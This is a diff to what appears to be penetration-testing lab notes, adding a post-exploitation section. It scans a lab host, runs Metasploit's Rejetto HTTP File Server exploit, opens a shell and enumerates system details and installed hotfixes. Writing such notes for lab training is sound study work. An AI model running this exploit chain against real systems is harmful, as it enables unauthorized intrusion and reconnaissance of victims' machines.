@@ -1779,12 +1779,22 @@ set RHOSTS 10.2.217.132
 exploit
 ```
 
+**Host & Network Penetration Testing: Post-Exploitation**
 
-
-
-
-
+93) Enumerating System Information
+ 
 ```
+nmap -sV 10.2.24.80
+searchsploit rejetto
+msfconsole
+use exploit/windows/http/rejetto_hsf_exec
+set RHOSTS 10.2.24.80
+exploit
+sysinfo
+shell
+hostname
+systeminfo
+wmic qfe get Caption,Description,HotFixID,InstalledOn
 
 ```
 
